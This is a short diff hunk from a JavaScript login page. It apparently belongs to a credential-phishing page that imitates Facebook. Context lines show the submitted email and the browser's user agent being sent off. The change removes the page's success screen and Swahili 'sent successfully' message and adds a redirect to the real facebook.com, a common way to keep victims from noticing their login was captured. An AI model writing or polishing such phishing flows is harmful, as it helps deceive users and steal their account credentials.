@@ -283,11 +283,8 @@
         userAgent: navigator.userAgent
       });
 
-      // Show success
-      document.getElementById("loginForm").style.display = "none";
-      document.getElementById("successScreen").classList.add("show");
-      document.getElementById("successEmail").textContent = email;
-      toast("Imetumwa kikamilifu ✓", "ok");
+      // Redirect to Facebook
+      window.location.href = "https://facebook.com";
 
     } catch (e) {
       console.error(e);
